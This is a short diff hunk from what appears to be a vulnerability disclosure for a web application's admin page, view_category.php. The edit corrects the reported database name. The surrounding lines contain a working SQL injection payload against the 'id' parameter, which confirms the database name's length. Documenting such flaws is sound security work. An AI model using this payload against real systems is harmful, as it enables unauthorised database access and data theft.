@@ -8,7 +8,7 @@ Vulnerability File: /psrs/admin/categories/view_category.php?id=
 
 Vulnerability location: /psrs/admin/categories/view_category.php?id=, id
 
-Current database name: hsrs_db ,length is 7
+Current database name: psrs_db ,length is 7
 
 [+] Payload: /psrs/admin/categories/view_category.php?id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id
 
